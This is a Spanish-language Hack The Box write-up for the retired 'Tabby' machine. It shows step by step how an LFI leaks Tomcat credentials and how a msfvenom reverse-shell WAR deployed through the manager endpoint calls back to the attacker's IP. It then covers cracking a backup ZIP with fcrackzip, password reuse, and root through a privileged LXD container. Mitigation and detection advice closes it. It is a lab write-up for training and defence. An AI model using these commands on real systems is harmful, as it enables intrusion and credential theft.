---
machine: Tabby
os: Linux
difficulty: Easy
platform: Hack The Box
category: Web / Linux
state: Retired
tags: [linux, tomcat, lfi, war-deploy, fcrackzip, password-reuse, lxd]
---

# Tabby — Hack The Box

[🇬🇧 English](README.en.md) | **Español**

> **Estado:** Retired. Ficha de método; sin flags ni credenciales reales.

## TL;DR

Un **LFI** en `news.php` deja leer `/etc/passwd` y el `tomcat-users.xml`, de donde salen credenciales de Tomcat con rol `manager-script`. Aunque `/manager/html` está restringido a localhost, `/manager/text/deploy` acepta un WAR por `PUT` → shell como `tomcat`. Un backup ZIP propiedad de `ash` se crackea con `fcrackzip`; esa misma contraseña sirve para `su ash`. `ash` está en el grupo **`lxd`**: un contenedor privilegiado con `/` montado da root.

## Reconocimiento

```bash
nmap -p- -sCV <IP> -oN nmap.txt
```

```text
22/tcp   open  ssh     OpenSSH 8.2p1 Ubuntu
80/tcp   open  http    nginx 1.18.0  → "Mega Hosting"
8080/tcp open  http    Apache Tomcat 9.0.31
```

```bash
ffuf -u http://<IP>/FUZZ -w /usr/share/wordlists/dirb/common.txt -fc 404
```

El sitio se sirve como vhost `megahosting.htb`; conviene añadirlo a `/etc/hosts` para que el 8080 resuelva bien.

```bash
echo "<IP> tabby.htb megahosting.htb" | sudo tee -a /etc/hosts
```

## Enumeración

- El sitio del 80 es «Mega Hosting» y sólo responde bien con el vhost `megahosting.htb`: sin él, el LFI parece roto porque se sirve otra página.
- `news.php?file=statement` es el parámetro vulnerable; `../../../../etc/passwd` confirma el traversal y revela `ash` y `tomcat`.
- **8080** es Tomcat 9.0.31. El `tomcat-users.xml` útil está en `/usr/share/tomcat9/etc/tomcat-users.xml` (paquete de Ubuntu), no en `/opt/tomcat/conf/`.
- El usuario `tomcat` tiene rol `manager-script`: `/manager/html` da 403 desde fuera, pero `/manager/text` funciona.

## Foothold

1. **LFI** en la sección de noticias:

```bash
curl 'http://megahosting.htb/news.php?file=../../../../etc/passwd'
curl 'http://megahosting.htb/news.php?file=../../../../usr/share/tomcat9/etc/tomcat-users.xml'
```

```xml
<user username="tomcat" password="<password>" roles="tomcat,admin-gui,manager-script"/>
```

2. **Despliegue de un WAR**: `/manager/html` responde 403 desde fuera (sólo localhost), pero el endpoint de texto sí funciona con `manager-script`.

```bash
msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP> LPORT=4444 -f war -o shell.war
curl -X PUT -u tomcat:<password> \
  -T shell.war "http://tabby.htb:8080/manager/text/deploy?path=/shell&update=true"
```

```bash
curl http://tabby.htb:8080/shell/
```

```text
tomcat@tabby:/$
```

3. **Backup de `ash`**: `linpeas` señala un ZIP en el webroot.

```bash
ls -lhA /var/www/html/files
fcrackzip -D -p /usr/share/wordlists/rockyou.txt /var/www/html/files/16162020_backup.zip
unzip 16162020_backup.zip -d /tmp/backup
```

La contraseña del ZIP es también la de la cuenta `ash`:

```bash
su ash
```

## Movimiento lateral

`tomcat` → `ash`: en `/var/www/html/files/` hay un backup ZIP que se crackea con `fcrackzip` y cuya contraseña es la de la cuenta `ash`. Es el único salto: el resto ya es escalada de privilegios con el grupo `lxd`.

## Escalada de privilegios

```bash
id
# uid=1000(ash) gid=1000(ash) groups=1000(ash),4(adm),24(cdrom),30(dip),46(plugdev),116(lxd)
```

Estar en `lxd` equivale a root: se importa una imagen y se arranca un contenedor **privilegiado** con el `/` del host montado.

```bash
# fuera: construir imagen alpine
sudo distrobuilder build-lxd alpine.yaml     # lxd.tar.xz + rootfs.squashfs
python3 -m http.server 8888

# en la víctima
wget http://<IP>:8888/lxd.tar.xz
wget http://<IP>:8888/rootfs.squashfs
lxc image import lxd.tar.xz rootfs.squashfs --alias alpine
lxc init alpine privesc -c security.privileged=true
lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true
lxc start privesc
lxc exec privesc /bin/sh
```

```text
# cat /mnt/root/root/root.txt
```

## Evidencia

- Salidas recortadas de los comandos clave; sin flags, credenciales ni tokens.
- Los valores reales viven en `private/` y no se publican.

## Lecciones aprendidas

- **403 en `/manager/html`**: no es un callejón; `/manager/text/deploy` sólo exige el rol `manager-script`.
- **`file=` relativo**: hay que subir suficientes niveles para salir del webroot.
- **Vhost**: sin `megahosting.htb` en `/etc/hosts`, el 80 sirve una página distinta y el LFI parece roto.
- **`lxc` vs `lxd`**: hace falta una imagen importada; sin ella `lxc init` falla. El contenedor debe ser privilegiado y con el disco del host montado.

- Un LFI que alcanza `tomcat-users.xml` convierte un servicio interno en RCE por despliegue de WAR.
- La reutilización de contraseñas ZIP → sistema es habitual; el backup estaba en el propio webroot.
- Pertenecer a `lxd`/`docker` es root de facto: el grupo permite montar el sistema de ficheros del host.
- Mitigación: parchear el LFI, rotar credenciales de Tomcat, sacar backups del webroot y eliminar a los usuarios de los grupos de contenedores.

## Mitigaciones y detección

- Corregir el LFI de `news.php` (validar `file` contra una lista blanca) y sacar `tomcat-users.xml` de rutas legibles por la web.
- Rotar las credenciales de Tomcat y limitar `/manager/text` por IP; deshabilitar `manager-script` si no se usa.
- No dejar backups en el webroot y no reutilizar la contraseña del ZIP como contraseña de sistema.
- Sacar a los usuarios de los grupos `lxd`/`docker`: son root de facto.
- Detección: lecturas de `tomcat-users.xml` por HTTP, `PUT /manager/text/deploy` y aparición de contextos nuevos en Tomcat.

## Referencias

- [Hack The Box — Tabby](https://www.hackthebox.com/machines/tabby)
- [HackTricks — LXD/LXC privilege escalation](https://book.hacktricks.xyz/linux-hardening/privilege-escalation/interesting-groups-linux-pe/lxd-privilege-escalation)
